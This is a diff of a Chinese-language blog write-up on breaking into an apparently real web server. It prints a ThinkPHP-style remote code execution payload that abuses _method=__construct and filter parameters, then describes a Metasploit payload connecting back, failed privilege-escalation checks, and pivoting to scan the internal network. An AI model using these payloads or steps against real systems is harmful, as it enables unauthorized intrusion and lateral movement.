@@ -69,7 +69,7 @@
 <p><img src="/images/pasted-24.png" alt="upload successful"></p>
 <pre><code>    通过各种方式，最后成功绕过并getshell，下面记录一下为自己做个笔记</code></pre>
 <p>1、post方式提交并输出phpinfo</p>
-<pre><code>  http://x.x.x.x/s=portal
+<pre><code>  http://x.x.x.x/?s=portal
   _method=__construct&amp;filter[]=phpinfo&amp;method=GET&amp;get[]=1
   或者_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;get[]=phpinfo
   成功输出，通过phpinfo查看到它过滤的超多的函数</code></pre>
@@ -95,7 +95,16 @@
 <p><img src="/images/pasted-35.png" alt="upload successful">       </p>
 <p><img src="/images/pasted-36.png" alt="upload successful"></p>
 <p><img src="/images/pasted-37.png" alt="upload successful"></p>
-<pre><code>      因为其内网有域环境，此篇文章将持续更新！！！</code></pre>
+<p>6、提权</p>
+<pre><code>    初步发现此主机可以出网，那我就直接传马去msf上操作了
+    直接msf生成马，设置监听，运行上线</code></pre>
+<p><img src="/images/pasted-38.png" alt="upload successful"></p>
+<pre><code>    既然权限低，就试试提权，直接用msf提权检测模块检测一波
+    multi/recon/local_exploit_suggester，检测出一个，去试试看能否成功返回shell，不过后续也没提权成功。。我又扫了下端口，发现只有个BT,权限不高，还没法子知道路径及密码，最后也就先放弃了，打算不提权了，直接当跳板机使用。</code></pre>
+<p><img src="/images/pasted-40.png" alt="upload successful"></p>
+<p>7、扫描内网</p>
+<pre><code>  查看路由并添加</code></pre>
+<p><img src="/images/pasted-42.png" alt="upload successful"></p>
 <div id="gitalk-container"></div>
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
 <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
